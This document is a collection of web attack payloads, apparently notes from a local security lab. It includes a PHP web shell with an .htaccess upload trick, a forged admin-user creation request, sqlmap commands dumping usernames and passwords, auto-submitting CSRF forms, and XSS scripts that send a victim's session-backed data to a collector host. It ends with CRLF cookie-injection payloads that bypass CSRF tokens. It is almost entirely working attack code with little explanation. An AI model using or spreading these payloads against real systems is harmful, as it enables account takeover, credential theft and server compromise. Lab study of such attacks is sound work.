.htaccess : AddType application/x-httpd-php .xyz

shell: 
        <?php
        define('CMD' , 'id');
        
        echo '<pre>' . exec(CMD) .'<pre>' ;
        
        ?>


csrfmiddlewaretoken=zYm4zMmaGVeYybrVlRusjVTyPoBNlR7m1pnfURIZugwEDrXgkLPLoTpnUpdmRlRj&url=http%3A%2F%2Flocalhost%3A30000%2Fv1%2Fadmin%2Fadduser%3Fusername%3Dattacker%26userid%3D56456%26email%3Dattacker.com%26phone%3D1111111%26password%3Dpass


1. Use --where
If you already know the table and column names, you can add a WHERE clause to restrict the dump:

bash
sqlmap -u "http://localhost:30000/participants.php?courseid=5" \
--cookie="PHPSESSID=v5t7jifqq5u6o5r7ndvce9an4f" \
-T users -C username,password \
--dump --where="username='Neha'" --batch
This will only dump the row(s) where username = 'Neha'.

2. Use --search + --columns
If you’re not sure of the exact column names, first run:

bash
sqlmap -u "http://localhost:30000/participants.php?courseid=5" \
--cookie="PHPSESSID=v5t7jifqq5u6o5r7ndvce9an4f" \
-T users --columns
That will list all columns in the users table. Once you know the right column (e.g., username), you can go back to the --where method above.

3. Use --sql-query
If you want full control, you can directly run a custom SQL query:

bash
sqlmap -u "http://localhost:30000/participants.php?courseid=5" \
--cookie="PHPSESSID=v5t7jifqq5u6o5r7ndvce9an4f" \
--sql-query="SELECT * FROM users WHERE username='Neha';"
This bypasses the dump mechanism and just executes your query.






<form method="post" action="http://localhost:30000/updateEmail/">
        <h1>Welcome to 's Profile</h1>
        <label for="username">Username:</label>
        <input type="text" value="Laksh" readonly class="w3-input w3-border">

        <label for="email">Current Email:</label>
        <input type="text" value="laksh@bodhitree.com" readonly class="w3-input w3-border">
        <label for="new_email">Update Email:</label>
        <input type="text" id="new_email" name="new_email" value="laksh56@bodhitree.com" class="w3-input w3-border" required>
        <button type="submit" class="w3-button w3-blue w3-margin-top">Submit</button>
        </form>
<script>
document.forms[0].submit()
</script>


<form method="post" action="http://localhost:30000/updateEmail/">
     
        <input type="text" id="new_email" name="new_email" value="attacker@bodhitree.com" class="w3-input w3-border" required>
     
        </form>
<script>
document.forms[0].submit()
</script>


<script>
  fetch('http://app.bodhitree.com:30000/userData', {
    method: 'GET',
    credentials: 'include'
  })
  .then(response => response.text())
  .then(data => {
    var i = new Image();
    i.src = 'http://localhost:30001/log?key=' + encodeURIComponent(data);
  });
</script>


<script>
      window.location = "http://app.bodhitree.com:30000/participants/?courseid=3&search=%3Cscript%3Efetch('http://app.bodhitree.com:30000/userData',{credentials:'include'}).then(r=>r.text()).then(d=>{var i=new Image();i.src='http://localhost:30001/log?key='+encodeURIComponent(d);});%3C/script%3E";
    </script>
    
    
    <script>
  fetch('http://app.bodhitree.com:30000/userData', {
    method: 'GET',
    credentials: 'include'
  })
  .then(response => response.text())
  .then(data => {
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'http://localhost:30001/log?key=' + encodeURIComponent(data);
    document.body.appendChild(iframe);
  });
</script>


<script>
      window.location = "http://app.bodhitree.com:30000/participants/?courseid=3&search=%3Cscript%3E+++fetch%28%27http%3A%2F%2Fapp.bodhitree.com%3A30000%2FuserData%27%2C+%7B+++++method%3A+%27GET%27%2C+++++credentials%3A+%27include%27+++%7D%29+++.then%28response+%3D%3E+response.text%28%29%29+++.then%28data+%3D%3E+%7B+++++var+iframe+%3D+document.createElement%28%27iframe%27%29%3B+++++iframe.style.display+%3D+%27none%27%3B+++++iframe.src+%3D+%27http%3A%2F%2Flocalhost%3A30001%2Flog%3Fkey%3D%27+%2B+encodeURIComponent%28data%29%3B+++++document.body.appendChild%28iframe%29%3B+++%7D%29%3B+%3C%2Fscript%3E";
    </script>
    
    
<form action="http://localhost:30000/userDetails/" method="POST">
      <input type="hidden" value="fakeToken" readonly="" name="csrftoken" required="">
      <input type="text" id="new_email" name="new_email" value="attacker.com" placeholder="laksh@bodhitree.com" class="w3-input w3-border" required="">
    </form>

    <script>
      var img = new Image();
      img.src = "http://localhost:30000/participants/?courseid=5?search=dogs%0d%0aSet-Cookie:%20csrftoken=fakeToken%3b";
      document.forms[0].submit();
    </script>
    
    
<form action="http://localhost:30000/updateEmail/" method="POST">
      <input type="hidden" value="fakeToken" readonly="" name="csrftoken" required="">
      <input type="text" id="new_email" name="new_email" value="attacker.com" placeholder="laksh@bodhitree.com" class="w3-input w3-border" required="">
    </form>

      <img src = "http://localhost:30000/participants/?courseid=5?search=dogs%0d%0aSet-Cookie:%20csrftoken=fakeToken%3b" onerror="document.forms[0].submit()">
